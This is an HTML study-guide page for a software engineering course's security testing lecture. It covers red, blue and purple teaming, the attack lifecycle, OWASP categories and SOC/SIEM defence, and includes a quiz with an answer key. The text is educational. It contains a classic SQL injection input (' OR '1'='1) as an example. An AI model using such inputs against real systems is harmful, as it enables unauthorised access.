@@ -1,0 +1,912 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Security Testing — Red Team vs. Blue Team — CT3 Study Guide</title>
+<style>
+/* ============================================================
+   CT3 Study Guides — shared dark academic theme
+   Identical across every lecture file. Edit here, regenerate all.
+   ============================================================ */
+
+:root {
+  --bg: #0b0e11;
+  --surface: #12161b;
+  --card: #1a1f26;
+  --card-border: #262d37;
+  --text: #e8ecf1;
+  --text-dim: #9aa4b2;
+  --text-faint: #626d7a;
+  --accent: #4a90f8;
+  --accent-dim: #2c5aa8;
+  --success: #22c55e;
+  --success-bg: rgba(34, 197, 94, 0.12);
+  --warning: #f59e0b;
+  --error: #f56363;
+  --error-bg: rgba(245, 99, 99, 0.12);
+  --radius-sm: 4px;
+  --radius-md: 8px;
+  --radius-lg: 12px;
+  --space-1: 4px;
+  --space-2: 8px;
+  --space-3: 12px;
+  --space-4: 16px;
+  --space-6: 24px;
+  --space-8: 32px;
+  --font-sans: -apple-system, BlinkMacSystemFont, "Segoe UI", Inter, Roboto, Helvetica, Arial, sans-serif;
+  --font-mono: ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", monospace;
+  --duration-fast: 150ms;
+  --duration-normal: 250ms;
+  --easing: cubic-bezier(0.2, 0, 0, 1);
+}
+
+* { box-sizing: border-box; }
+
+html { scroll-behavior: smooth; }
+
+body {
+  margin: 0;
+  background: var(--bg);
+  color: var(--text);
+  font-family: var(--font-sans);
+  font-size: 16px;
+  line-height: 1.6;
+  -webkit-font-smoothing: antialiased;
+}
+
+::selection { background: var(--accent-dim); color: #fff; }
+
+/* ---------- Nav ---------- */
+
+.topnav {
+  position: sticky;
+  top: 0;
+  z-index: 100;
+  background: rgba(11, 14, 17, 0.92);
+  backdrop-filter: blur(10px);
+  border-bottom: 1px solid var(--card-border);
+}
+
+.topnav-inner {
+  max-width: 980px;
+  margin: 0 auto;
+  padding: var(--space-3) var(--space-6);
+  display: flex;
+  align-items: center;
+  gap: var(--space-4);
+}
+
+.topnav-brand {
+  font-weight: 700;
+  font-size: 14px;
+  letter-spacing: 0.02em;
+  color: var(--text);
+  text-decoration: none;
+  white-space: nowrap;
+}
+
+.topnav-brand span { color: var(--accent); }
+
+.topnav-links {
+  display: flex;
+  gap: var(--space-1);
+  overflow-x: auto;
+  scrollbar-width: thin;
+  flex: 1;
+}
+
+.topnav-links::-webkit-scrollbar { height: 4px; }
+.topnav-links::-webkit-scrollbar-thumb { background: var(--card-border); border-radius: 2px; }
+
+.topnav-links a {
+  flex: none;
+  padding: var(--space-1) var(--space-2);
+  border-radius: var(--radius-sm);
+  color: var(--text-dim);
+  text-decoration: none;
+  font-size: 13px;
+  font-weight: 500;
+  white-space: nowrap;
+  transition: background var(--duration-fast) var(--easing), color var(--duration-fast) var(--easing);
+}
+
+.topnav-links a:hover { background: var(--card); color: var(--text); }
+.topnav-links a.active { background: var(--accent-dim); color: #fff; }
+
+/* ---------- Layout ---------- */
+
+.page {
+  max-width: 860px;
+  margin: 0 auto;
+  padding: var(--space-8) var(--space-6) 120px;
+}
+
+.hero {
+  margin-bottom: var(--space-8);
+}
+
+.hero-eyebrow {
+  font-family: var(--font-mono);
+  font-size: 12px;
+  text-transform: uppercase;
+  letter-spacing: 0.08em;
+  color: var(--accent);
+  margin-bottom: var(--space-2);
+}
+
+.hero h1 {
+  font-size: 30px;
+  line-height: 1.25;
+  margin: 0 0 var(--space-2);
+  letter-spacing: -0.01em;
+}
+
+.hero p {
+  color: var(--text-dim);
+  font-size: 16px;
+  margin: 0;
+}
+
+.section-tabs {
+  display: flex;
+  gap: var(--space-2);
+  margin-bottom: var(--space-6);
+  border-bottom: 1px solid var(--card-border);
+  position: sticky;
+  top: 53px;
+  background: var(--bg);
+  z-index: 50;
+  padding-top: var(--space-2);
+}
+
+.section-tab {
+  padding: var(--space-2) var(--space-4);
+  background: none;
+  border: none;
+  color: var(--text-dim);
+  font-family: var(--font-sans);
+  font-size: 14px;
+  font-weight: 600;
+  cursor: pointer;
+  border-bottom: 2px solid transparent;
+  margin-bottom: -1px;
+  transition: color var(--duration-fast) var(--easing);
+}
+
+.section-tab:hover { color: var(--text); }
+.section-tab.active { color: var(--accent); border-bottom-color: var(--accent); }
+
+.section-panel { display: none; }
+.section-panel.active { display: block; animation: fadein var(--duration-normal) var(--easing); }
+
+@keyframes fadein {
+  from { opacity: 0; transform: translateY(4px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+/* ---------- Content (rendered markdown) ---------- */
+
+.content h2 {
+  font-size: 22px;
+  margin: var(--space-8) 0 var(--space-4);
+  padding-bottom: var(--space-2);
+  border-bottom: 1px solid var(--card-border);
+  letter-spacing: -0.005em;
+}
+.content h2:first-child { margin-top: 0; }
+
+.content h3 {
+  font-size: 17px;
+  color: var(--accent);
+  margin: var(--space-6) 0 var(--space-2);
+}
+
+.content p { color: var(--text); margin: 0 0 var(--space-4); }
+.content strong { color: #fff; font-weight: 600; }
+.content ul, .content ol { margin: 0 0 var(--space-4); padding-left: 22px; color: var(--text); }
+.content li { margin-bottom: var(--space-1); }
+.content li strong { color: var(--text); }
+
+.content code {
+  font-family: var(--font-mono);
+  font-size: 0.87em;
+  background: var(--card);
+  border: 1px solid var(--card-border);
+  padding: 1px 5px;
+  border-radius: var(--radius-sm);
+  color: #ffd479;
+}
+
+.content pre {
+  background: var(--surface);
+  border: 1px solid var(--card-border);
+  border-radius: var(--radius-md);
+  padding: var(--space-4);
+  overflow-x: auto;
+  margin: 0 0 var(--space-4);
+}
+
+.content pre code {
+  background: none;
+  border: none;
+  padding: 0;
+  color: #d8dee9;
+  font-size: 13px;
+  line-height: 1.55;
+}
+
+.content table {
+  width: 100%;
+  border-collapse: collapse;
+  margin: 0 0 var(--space-4);
+  font-size: 14px;
+  display: block;
+  overflow-x: auto;
+}
+
+.content th, .content td {
+  border: 1px solid var(--card-border);
+  padding: var(--space-2) var(--space-3);
+  text-align: left;
+  vertical-align: top;
+}
+
+.content th {
+  background: var(--card);
+  color: var(--accent);
+  font-weight: 600;
+  white-space: nowrap;
+}
+
+.content tr:nth-child(even) td { background: rgba(255,255,255,0.015); }
+
+.content hr {
+  border: none;
+  border-top: 1px solid var(--card-border);
+  margin: var(--space-8) 0;
+}
+
+/* ---------- Quiz (MCQ) ---------- */
+
+.quiz-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: var(--space-4);
+  margin-bottom: var(--space-6);
+  flex-wrap: wrap;
+}
+
+.quiz-score {
+  font-family: var(--font-mono);
+  font-size: 14px;
+  color: var(--text-dim);
+}
+.quiz-score b { color: var(--text); }
+
+.progress-bar {
+  height: 6px;
+  background: var(--card);
+  border-radius: 999px;
+  overflow: hidden;
+  flex: 1;
+  min-width: 120px;
+}
+.progress-bar-fill {
+  height: 100%;
+  background: var(--accent);
+  border-radius: 999px;
+  transition: width var(--duration-normal) var(--easing);
+}
+
+.btn {
+  font-family: var(--font-sans);
+  font-size: 13px;
+  font-weight: 600;
+  padding: var(--space-2) var(--space-4);
+  border-radius: var(--radius-sm);
+  border: 1px solid var(--card-border);
+  background: var(--card);
+  color: var(--text);
+  cursor: pointer;
+  transition: background var(--duration-fast) var(--easing), border-color var(--duration-fast) var(--easing);
+}
+.btn:hover { background: #232a33; border-color: #38414d; }
+.btn-accent { background: var(--accent); border-color: var(--accent); color: #fff; }
+.btn-accent:hover { background: #3a7de0; }
+
+.mcq-card {
+  background: var(--surface);
+  border: 1px solid var(--card-border);
+  border-radius: var(--radius-lg);
+  padding: var(--space-6);
+  margin-bottom: var(--space-4);
+}
+
+.mcq-q {
+  font-size: 15px;
+  font-weight: 600;
+  margin: 0 0 var(--space-4);
+  display: flex;
+  gap: var(--space-2);
+}
+
+.mcq-q .mcq-index {
+  color: var(--accent);
+  font-family: var(--font-mono);
+  flex: none;
+}
+
+.mcq-options { display: flex; flex-direction: column; gap: var(--space-2); }
+
+.mcq-option {
+  text-align: left;
+  padding: var(--space-3) var(--space-4);
+  border-radius: var(--radius-md);
+  border: 1px solid var(--card-border);
+  background: var(--card);
+  color: var(--text);
+  font-family: var(--font-sans);
+  font-size: 14px;
+  cursor: pointer;
+  transition: border-color var(--duration-fast) var(--easing), background var(--duration-fast) var(--easing);
+}
+
+.mcq-option:hover:not(:disabled) { border-color: var(--accent); }
+.mcq-option:disabled { cursor: default; }
+
+.mcq-option.correct { background: var(--success-bg); border-color: var(--success); color: #baf7cf; }
+.mcq-option.incorrect { background: var(--error-bg); border-color: var(--error); color: #ffc9c9; }
+.mcq-option.reveal-correct { border-color: var(--success); color: #baf7cf; }
+
+.mcq-explanation {
+  margin-top: var(--space-4);
+  padding: var(--space-3) var(--space-4);
+  background: var(--card);
+  border-left: 3px solid var(--accent);
+  border-radius: 0 var(--radius-sm) var(--radius-sm) 0;
+  font-size: 13.5px;
+  color: var(--text-dim);
+  display: none;
+}
+.mcq-explanation.show { display: block; animation: fadein var(--duration-normal) var(--easing); }
+.mcq-explanation b { color: var(--text); }
+
+/* ---------- Tech questions ---------- */
+
+.tech-card {
+  background: var(--surface);
+  border: 1px solid var(--card-border);
+  border-radius: var(--radius-lg);
+  padding: var(--space-6);
+  margin-bottom: var(--space-4);
+}
+
+.tech-q-row {
+  display: flex;
+  align-items: flex-start;
+  gap: var(--space-3);
+  justify-content: space-between;
+}
+
+.tech-q {
+  font-size: 15px;
+  font-weight: 600;
+  margin: 0;
+  flex: 1;
+  display: flex;
+  gap: var(--space-2);
+}
+.tech-q .mcq-index { color: var(--accent); font-family: var(--font-mono); flex: none; }
+
+.tech-reviewed-label {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  font-size: 12px;
+  color: var(--text-faint);
+  flex: none;
+  cursor: pointer;
+  user-select: none;
+  white-space: nowrap;
+}
+.tech-reviewed-label input { accent-color: var(--accent); }
+
+.tech-answer {
+  margin-top: var(--space-4);
+  padding-top: var(--space-4);
+  border-top: 1px solid var(--card-border);
+  display: none;
+  font-size: 14px;
+  color: var(--text-dim);
+}
+.tech-answer.show { display: block; animation: fadein var(--duration-normal) var(--easing); }
+.tech-answer p { margin: 0 0 var(--space-3); color: var(--text-dim); }
+.tech-answer ul { margin: 0 0 var(--space-3); padding-left: 20px; }
+.tech-answer strong { color: var(--text); }
+.tech-answer code {
+  font-family: var(--font-mono);
+  font-size: 0.87em;
+  background: var(--card);
+  border: 1px solid var(--card-border);
+  padding: 1px 5px;
+  border-radius: var(--radius-sm);
+  color: #ffd479;
+}
+
+.reveal-btn {
+  margin-top: var(--space-4);
+}
+
+/* ---------- Footer ---------- */
+
+.page-footer {
+  margin-top: var(--space-8);
+  padding-top: var(--space-6);
+  border-top: 1px solid var(--card-border);
+  display: flex;
+  justify-content: space-between;
+  gap: var(--space-4);
+  flex-wrap: wrap;
+}
+
+.page-footer a {
+  color: var(--text-dim);
+  text-decoration: none;
+  font-size: 14px;
+  font-weight: 600;
+}
+.page-footer a:hover { color: var(--accent); }
+
+@media (max-width: 640px) {
+  .page { padding: var(--space-6) var(--space-4) 100px; }
+  .hero h1 { font-size: 24px; }
+  .section-tabs { top: 49px; }
+}
+
+</style>
+</head>
+<body>
+<nav class="topnav">
+  <div class="topnav-inner">
+    <a href="index.html" class="topnav-brand">COS301 <span>Study Guides</span></a>
+    <div class="topnav-links">
+      <a href="index.html" class="">Home</a>
+<a href="L17.html" class="">L17 · Design Systems & CI</a>
+<a href="L18.html" class="">L18 · Domain Modelling & Architectures</a>
+<a href="L19.html" class="">L19 · Software Testing in Practice</a>
+<a href="L20.html" class="">L20 · Designed for Humans</a>
+<a href="L21.html" class="">L21 · DevOps & DevSecOps</a>
+<a href="L22.html" class="">L22 · Practical Architectural Design</a>
+<a href="L23.html" class="">L23 · Architecture in Practice</a>
+<a href="L24.html" class="active">L24 · Security Testing</a>
+<a href="L25.html" class="">L25 · Service Contracts</a>
+<a href="MS.html" class="">Bonus · Microservices Deep Dive</a>
+    </div>
+  </div>
+</nav>
+
+<main class="page">
+  <header class="hero">
+    <div class="hero-eyebrow">L24 &middot; Software Engineering</div>
+    <h1>Security Testing — Red Team vs. Blue Team</h1>
+    <p>General security testing fundamentals: red/blue/purple teaming, the attack lifecycle, OWASP Top 10, and blue team defense concepts (SIEM, SOC, incident response).</p>
+  </header>
+
+  <div class="section-tabs">
+    <button class="section-tab active" data-target="panel-content">Study Content</button>
+    <button class="section-tab" data-target="panel-mcq">MCQs (20)</button>
+    <button class="section-tab" data-target="panel-tech">Technical Questions (12)</button>
+  </div>
+
+  <section id="panel-content" class="section-panel active">
+    <div id="content-body" class="content"></div>
+  </section>
+
+  <section id="panel-mcq" class="section-panel">
+    <div id="mcq-panel-top" class="quiz-header">
+      <div class="progress-bar"><div id="quiz-progress-fill" class="progress-bar-fill" style="width:0%"></div></div>
+      <div id="quiz-score" class="quiz-score">0 / 0 correct</div>
+      <button id="quiz-reset" class="btn">Shuffle &amp; reset quiz</button>
+    </div>
+    <div id="mcq-list"></div>
+  </section>
+
+  <section id="panel-tech" class="section-panel">
+    <div class="quiz-header">
+      <div id="tech-counter" class="quiz-score">0 / 12 marked reviewed</div>
+    </div>
+    <div id="tech-list"></div>
+  </section>
+
+  <footer class="page-footer">
+    <a href="L23.html">&larr; L23</a>
+    <a href="L25.html">L25 &rarr;</a>
+  </footer>
+</main>
+
+<script id="lecture-data" type="application/json">{"id": "L24", "title": "Security Testing \u2014 Red Team vs. Blue Team", "subtitle": "General security testing fundamentals: red/blue/purple teaming, the attack lifecycle, OWASP Top 10, and blue team defense concepts (SIEM, SOC, incident response).", "contentMarkdown": "## Security Testing \u2014 Red Team vs. Blue Team\n\n> **Note on this lecture's source material:** the original L24 slide deck was almost entirely a company profile/recruitment presentation (from guest presenters at Integrity360), and the actual technical content was delivered as a **live, unscripted Red Team vs. Blue Team demonstration** that isn't captured in any slide text. The content below is therefore built from standard, industry-standard security testing knowledge covering the concepts a live red-team/blue-team demo would typically be built around, rather than transcribed from specific lecture slides. Treat this as solid general preparation for the topic area, and cross-check against your own notes from the live demo if you took any.\n\n### 1. What Is Security Testing?\n\nSecurity testing is the practice of deliberately probing a system for weaknesses **before an attacker does**, so they can be fixed proactively. It spans a spectrum from automated scanning to fully manual, human-driven attack simulation:\n\n- **Vulnerability scanning** \u2014 automated tools compare a system against known-vulnerability databases (e.g. CVEs) and misconfiguration checklists. Fast, cheap, broad coverage, but shallow \u2014 it finds known patterns, not novel logic flaws.\n- **Vulnerability assessment** \u2014 a broader, still mostly tool-driven review of a system's security posture, typically producing a prioritized list of weaknesses.\n- **Penetration testing (\"pentesting\")** \u2014 a human tester actively attempts to exploit vulnerabilities to demonstrate real, chained impact (e.g. \"this misconfiguration lets me read the admin's session token, which lets me impersonate them, which lets me exfiltrate customer data\") \u2014 going beyond just *listing* weaknesses to *proving* what an attacker could actually achieve.\n- **Red team engagement** \u2014 a broader, more adversarial, often longer-running simulation of a real attacker, frequently without the defensive (blue) team knowing in advance, testing not just technical vulnerabilities but detection and response capability too.\n\n### 2. Red Team vs. Blue Team vs. Purple Team\n\n| Team | Role |\n|---|---|\n| **Red Team** | Plays the attacker. Attempts to breach the system using real-world adversary techniques \u2014 reconnaissance, exploitation, lateral movement, exfiltration \u2014 to test both technical defenses and human/process response. |\n| **Blue Team** | Plays the defender. Responsible for detecting, responding to, and containing the red team's (or a real attacker's) activity \u2014 monitoring logs, alerting on anomalies, investigating incidents, and hardening the environment. |\n| **Purple Team** | Not a separate team but a **collaborative mode** \u2014 red and blue actively share findings and techniques *during* the exercise (rather than only in a report afterward), specifically to accelerate the blue team's detection capability improvements. |\n\n**Why run both sides at once (a red/blue exercise) rather than just a pentest report:** a pentest report alone tells you *what* vulnerabilities exist. A live red-vs-blue exercise additionally tests whether your **detection and response process** actually works in practice \u2014 did the blue team notice the attack at all, how long did it take them, and what did they do about it. Many organisations have real vulnerabilities *and* real gaps in their ability to detect exploitation of those vulnerabilities \u2014 a red/blue exercise surfaces both.\n\n### 3. A Typical Attack Lifecycle (What the Red Team Follows)\n\nA common way to structure an attack simulation, loosely based on frameworks like the Cyber Kill Chain / MITRE ATT&CK:\n\n1. **Reconnaissance** \u2014 gather information about the target: exposed services, employee names/emails (for phishing), technology stack, public code repositories, leaked credentials.\n2. **Initial access** \u2014 get a first foothold, e.g. via a phishing email with a malicious attachment, exploiting an internet-facing vulnerability, or using a leaked/weak credential.\n3. **Execution** \u2014 run code on the compromised system.\n4. **Persistence** \u2014 ensure continued access even if the initial entry point is closed (e.g. a reboot, a patched vulnerability) \u2014 e.g. a scheduled task, a new admin account, a backdoor.\n5. **Privilege escalation** \u2014 move from a low-privilege foothold (e.g. a regular user's laptop) to higher privileges (e.g. domain administrator).\n6. **Lateral movement** \u2014 move from the initially compromised system to other systems on the network, using harvested credentials or trust relationships.\n7. **Exfiltration / impact** \u2014 achieve the actual objective: stealing data, encrypting systems (ransomware), or disrupting operations.\n\n**What the Blue Team is doing throughout:** monitoring logs and alerts (often via a SIEM \u2014 Security Information and Event Management system) for signs of each stage above, investigating anomalies, and \u2014 once an incident is confirmed \u2014 following an incident response process (containment, eradication, recovery, and a post-incident review).\n\n### 4. Application-Layer Security Testing: The OWASP Top 10\n\nFor testing web applications specifically (as opposed to network/infrastructure), the **OWASP Top 10** is the industry-standard baseline of the most critical risks to test for, including (representative categories, exact list/wording is periodically revised):\n\n- **Broken Access Control** \u2014 a user can access data or perform actions they shouldn't be authorized for (e.g. changing a URL parameter to view another user's account).\n- **Injection** (e.g. SQL injection) \u2014 untrusted input is concatenated into a query/command, letting an attacker alter its meaning (e.g. bypassing a login check, or reading arbitrary database rows).\n- **Cryptographic Failures** \u2014 sensitive data transmitted or stored without adequate encryption, or using weak/broken cryptographic algorithms.\n- **Security Misconfiguration** \u2014 default credentials left in place, unnecessary features/ports enabled, verbose error messages leaking internal details.\n- **Vulnerable and Outdated Components** \u2014 using a library or dependency with a known, unpatched vulnerability (directly connecting to the CVE/dependency-scanning material covered in the DevSecOps lecture).\n- **Identification and Authentication Failures** \u2014 weak password policies, missing multi-factor authentication, session tokens that don't expire or aren't invalidated on logout.\n- **Server-Side Request Forgery (SSRF)** \u2014 an attacker tricks the server into making a request to an unintended destination (e.g. reaching internal-only services from an external-facing input).\n\n### 5. Common Technical Testing Techniques\n\n- **SQL Injection (SQLi):** submitting crafted input like `' OR '1'='1` into a query built by string concatenation, to bypass authentication or extract data. Defended against by using parameterised queries/prepared statements rather than concatenating user input into SQL.\n- **Cross-Site Scripting (XSS):** injecting malicious script into a web page that then executes in another user's browser (e.g. via an unsanitised comment field), potentially stealing session cookies or performing actions as that user. Defended against by properly escaping/encoding output and using a strict Content-Security-Policy.\n- **Phishing / social engineering:** targeting people rather than technology directly \u2014 a crafted email tricking an employee into entering credentials on a fake login page, or opening a malicious attachment. Often the initial access vector in real-world breaches, which is why red team exercises frequently include a phishing component alongside purely technical testing.\n- **Privilege escalation:** exploiting a misconfiguration or vulnerability to gain higher-level access than originally granted (e.g. a web app running as root, so compromising the app grants root on the host).\n- **Credential stuffing / password attacks:** trying previously-leaked username/password combinations (credential stuffing) or systematically guessing passwords (brute force) against a login endpoint.\n\n### 6. Blue Team Defensive Concepts\n\n- **SOC (Security Operations Center):** a dedicated team/facility that continuously monitors an organisation's systems for security events, typically staffed to provide 24/7 coverage given attacks aren't limited to business hours.\n- **SIEM (Security Information and Event Management):** a system that aggregates logs and security events from across an organisation's infrastructure into one place, correlating them to surface suspicious patterns a human wouldn't spot by looking at any single log source alone.\n- **Detection engineering:** writing and tuning the specific rules/alerts a SIEM (or other tooling) uses to flag suspicious activity \u2014 a red team exercise is a direct way to test whether these detections actually fire when they should.\n- **Incident response:** the structured process followed once a security incident is confirmed \u2014 typically covering identification, containment (stopping the attack from spreading further), eradication (removing the attacker's access), recovery (restoring normal operation), and a post-incident/lessons-learned review.\n- **Defense in depth:** the principle that no single security control should be relied upon alone \u2014 layering multiple, independent controls (network segmentation, endpoint detection, access control, monitoring) means a failure or bypass of any one layer doesn't immediately lead to full compromise.\n\n### 7. Why Run Red/Blue Exercises at All\n\n- They test the **whole system**, not just the code \u2014 including human process, detection tooling, and response speed, which a purely automated vulnerability scan cannot evaluate.\n- They surface **detection gaps**, not just vulnerability gaps \u2014 a known vulnerability that the blue team would actually catch and respond to quickly is a very different risk than one that would go completely unnoticed.\n- They build **real operational muscle memory** for the blue team, under realistic (if simulated) pressure, ahead of facing a genuine incident.\n- Findings feed directly back into improving detection rules, patching processes, and security training \u2014 closing the loop, conceptually similar to how DevSecOps integrates security checks throughout the development pipeline rather than treating it as a one-time audit.\n", "mcqs": [{"id": "m1", "q": "What is the key difference between a vulnerability scan and a penetration test?", "options": ["They are identical processes with different names", "A vulnerability scan is automated and identifies known patterns; a penetration test involves a human actively exploiting vulnerabilities to demonstrate real, chained impact", "Vulnerability scans are always more thorough than penetration tests", "Penetration tests never use automated tools"], "correct": 1, "explanation": "Scanning is fast/automated/shallow (known patterns); pentesting is human-driven and proves real, chained impact."}, {"id": "m2", "q": "What role does the Red Team play in a security exercise?", "options": ["Defends the system and responds to incidents", "Plays the attacker, simulating real-world adversary techniques to test defenses", "Writes the final compliance report only", "Manages the SIEM tooling"], "correct": 1, "explanation": "The Red Team plays the attacker role throughout the exercise."}, {"id": "m3", "q": "What role does the Blue Team play?", "options": ["Attacks the system to find vulnerabilities", "Defends the system \u2014 detecting, responding to, and containing attacker activity", "Only writes phishing emails", "Performs code reviews exclusively"], "correct": 1, "explanation": "The Blue Team is the defensive counterpart, responsible for detection and response."}, {"id": "m4", "q": "What distinguishes \"Purple Team\" from Red and Blue teams?", "options": ["It's a third, entirely separate team with its own attack techniques", "It's a collaborative mode where red and blue actively share findings and techniques during the exercise, to accelerate blue team detection improvements", "It only exists in automated tooling, not as a human activity", "It replaces the need for a SOC"], "correct": 1, "explanation": "Purple teaming is a collaborative mode, not a separate team with its own independent function."}, {"id": "m5", "q": "Why is a live red-vs-blue exercise more valuable than a pentest report alone?", "options": ["It's cheaper to run", "It additionally tests whether the detection and response process actually works in practice, not just whether vulnerabilities exist", "It requires no reporting afterward", "It only tests network infrastructure, never applications"], "correct": 1, "explanation": "A report shows what vulnerabilities exist; a live exercise also tests whether the blue team would actually detect and respond."}, {"id": "m6", "q": "In a typical attack lifecycle, what does \"persistence\" refer to?", "options": ["The initial information-gathering phase", "Ensuring continued access even if the initial entry point is closed (e.g. patched or rebooted)", "Moving from a low-privilege foothold to admin-level access", "Encrypting stolen data before exfiltration"], "correct": 1, "explanation": "Persistence is specifically about surviving the closure of the original access route."}, {"id": "m7", "q": "What is \"lateral movement\" in an attack lifecycle?", "options": ["Gathering public information about a target before attacking", "Moving from the initially compromised system to other systems on the network, using harvested credentials or trust relationships", "The process of writing an incident response report", "Scanning for open ports on a single server"], "correct": 1, "explanation": "Lateral movement spreads access across the network, beyond the first compromised system."}, {"id": "m8", "q": "What is the difference between privilege escalation and lateral movement?", "options": ["They are the same technique with different names", "Privilege escalation increases the attacker's access level on a system they already have a foothold on; lateral movement spreads that foothold to additional systems", "Privilege escalation only applies to databases", "Lateral movement always requires phishing"], "correct": 1, "explanation": "One is about depth of access on one system; the other is about breadth of access across systems."}, {"id": "m9", "q": "What is a SIEM used for?", "options": ["Writing application source code", "Aggregating logs and security events from across an organisation's infrastructure and correlating them to surface suspicious patterns", "Only storing employee HR records", "Automatically patching vulnerable dependencies"], "correct": 1, "explanation": "A SIEM's core job is log aggregation and correlation to surface patterns invisible in any single log source."}, {"id": "m10", "q": "What is the primary function of a SOC (Security Operations Center)?", "options": ["Developing new application features", "Continuously monitoring an organisation's systems for security events, typically providing 24/7 coverage", "Managing payroll and employee benefits", "Writing marketing material for the security team"], "correct": 1, "explanation": "A SOC exists specifically for continuous, round-the-clock security monitoring."}, {"id": "m11", "q": "What does \"defense in depth\" mean?", "options": ["Relying on a single, very strong security control", "Layering multiple, independent security controls so a failure or bypass of any one layer doesn't immediately lead to full compromise", "Only defending the network perimeter, ignoring internal systems", "A synonym for penetration testing"], "correct": 1, "explanation": "Defense in depth is specifically about layered, independent controls, not a single strong barrier."}, {"id": "m12", "q": "Which OWASP Top 10 category describes a user accessing data or performing actions they should not be authorized for, e.g. via a manipulated URL parameter?", "options": ["Injection", "Broken Access Control", "Cryptographic Failures", "Security Misconfiguration"], "correct": 1, "explanation": "Broken Access Control covers unauthorized access to data/actions, including via parameter manipulation."}, {"id": "m13", "q": "What is SQL injection, and what is the standard defense against it?", "options": ["An attack that requires no user input at all; defended by disabling SQL entirely", "Submitting crafted input that alters a query's meaning because it was built via string concatenation; defended by using parameterised queries/prepared statements", "A network-layer attack unrelated to databases; defended by firewalls only", "An attack only possible against NoSQL databases"], "correct": 1, "explanation": "SQLi exploits string-concatenated queries; parameterised queries/prepared statements are the standard fix."}, {"id": "m14", "q": "What is Cross-Site Scripting (XSS), and how does it typically cause harm?", "options": ["It's a database-only vulnerability with no browser involvement", "Injecting malicious script into a page that then executes in another user's browser, potentially stealing session cookies or performing actions as that user", "It exclusively targets server-side code execution", "It requires physical access to the target machine"], "correct": 1, "explanation": "XSS executes attacker script in a victim's browser, often to steal session state or act as that user."}, {"id": "m15", "q": "What is the standard defense against XSS?", "options": ["Disabling all JavaScript on the server permanently", "Properly escaping/encoding output and using a strict Content-Security-Policy", "Relying solely on antivirus software", "Using SQL parameterised queries"], "correct": 1, "explanation": "Output encoding/escaping plus a strict CSP are the standard XSS defenses."}, {"id": "m16", "q": "Why do red team exercises frequently include a phishing component alongside purely technical testing?", "options": ["Phishing is required by law in every penetration test", "Social engineering/phishing targets people rather than technology, and is often the initial access vector in real-world breaches", "Phishing is the only technique that tests blue team detection", "Technical vulnerabilities are no longer relevant to test"], "correct": 1, "explanation": "Phishing tests the human/process layer, which is a common real-world initial access vector alongside technical vulnerabilities."}, {"id": "m17", "q": "What is \"credential stuffing\"?", "options": ["Encrypting credentials before storing them", "Trying previously-leaked username/password combinations against a login endpoint, exploiting password reuse across services", "A technique for patching vulnerable dependencies", "A blue team detection method"], "correct": 1, "explanation": "Credential stuffing exploits password reuse using credentials leaked from unrelated breaches."}, {"id": "m18", "q": "Which of the following best describes \"Vulnerable and Outdated Components\" as an OWASP Top 10 risk category?", "options": ["Using a library or dependency with a known, unpatched vulnerability", "Writing code without any comments", "Using too many microservices", "Failing to use a message queue"], "correct": 0, "explanation": "This category is specifically about known-vulnerable dependencies \u2014 directly connecting to CVE/dependency-scanning material."}, {"id": "m19", "q": "What are the typical phases of incident response, once an incident is confirmed?", "options": ["Reconnaissance, exploitation, exfiltration", "Identification, containment, eradication, recovery, and a post-incident review", "Only patching and nothing else", "Marketing, sales, and legal notification only"], "correct": 1, "explanation": "This is the standard incident response phase sequence used by blue teams/SOCs."}, {"id": "m20", "q": "How does the \"defense in depth\" principle relate to the risk of a single vulnerability (e.g. a missed CVE patch) being exploited?", "options": ["Defense in depth means a single missed patch guarantees full compromise", "Even if one control (e.g. a patch) is missed, other independent layers (e.g. network segmentation, monitoring, access control) can still prevent or limit the impact of exploitation", "Defense in depth only applies to physical security, not software", "It means patching is unnecessary if other controls exist"], "correct": 1, "explanation": "Defense in depth's value is precisely that no single missed control results in total compromise, because other layers still apply."}], "techQuestions": [{"id": "t1", "q": "Using the attack lifecycle stages, explain how a red team exercise might chain phishing (initial access), privilege escalation, and lateral movement to go from \"one compromised laptop\" to \"domain administrator access.\" At which stage would a well-tuned blue team SIEM ideally have detected it?", "answer": "**The chain:**\n1. **Initial access (phishing):** the red team sends a crafted email to an employee, who opens a malicious attachment or enters credentials on a fake login page. This gives the red team code execution or valid credentials on that one employee's laptop.\n2. **Execution / persistence:** the red team establishes a foothold that survives a reboot \u2014 e.g. a scheduled task or a registered startup service \u2014 so they don't lose access if the laptop is restarted.\n3. **Privilege escalation:** on that single laptop, the red team exploits a local misconfiguration (e.g. an unpatched local vulnerability, or a stored credential for a higher-privileged local account) to move from the employee's standard user account to local administrator on that one machine.\n4. **Lateral movement:** using credentials harvested from that now-admin-level access on the laptop (e.g. cached domain credentials, or a service account password stored in a config file), the red team authenticates to other systems on the network \u2014 perhaps a file server, then a systems-management server.\n5. **Further privilege escalation:** on one of those additional systems (e.g. a systems-management server that happens to have domain-admin-level service accounts configured on it), the red team escalates again \u2014 this time gaining domain administrator rights, which grant control over the entire Windows domain, not just one machine.\n\n**Where a SIEM should ideally have caught it:** the earliest, cheapest point to catch this chain is actually **initial access** \u2014 a well-tuned email security/SIEM integration might flag the phishing email itself (a suspicious sender domain, an unusual attachment type) before the employee even opens it. Failing that, **persistence** (an unusual new scheduled task or service being created) and **lateral movement** (a single laptop suddenly authenticating to systems it's never touched before, or an unusual pattern of authentication attempts across the network) are both classic, well-documented detection points that a properly tuned SIEM correlates specifically because a single log line (\"laptop X logged into server Y\") looks unremarkable in isolation, but \"laptop X logged into servers it's never touched before, shortly after receiving a suspicious email, shortly before a new admin-level account was created\" is exactly the kind of *pattern across multiple log sources* a SIEM exists to surface that a human staring at any one log source would miss. Ideally, detection happens well before the final domain-admin escalation \u2014 the later in this chain detection occurs, the more damage has already been done."}, {"id": "t2", "q": "Compare a vulnerability scan, a penetration test, and a red team engagement in terms of depth, realism, and what each one tells you that the others don't.", "answer": "**Vulnerability scan:**\n- *Depth:* shallow \u2014 checks for known patterns (known CVEs, common misconfigurations) via automated tooling.\n- *Realism:* low \u2014 doesn't simulate an actual attacker's behaviour or goals, just enumerates matches against a signature database.\n- *What it uniquely tells you:* broad, fast coverage of \"which known weaknesses exist across this large surface area\" \u2014 good for finding the easy, obvious gaps across hundreds of systems quickly and 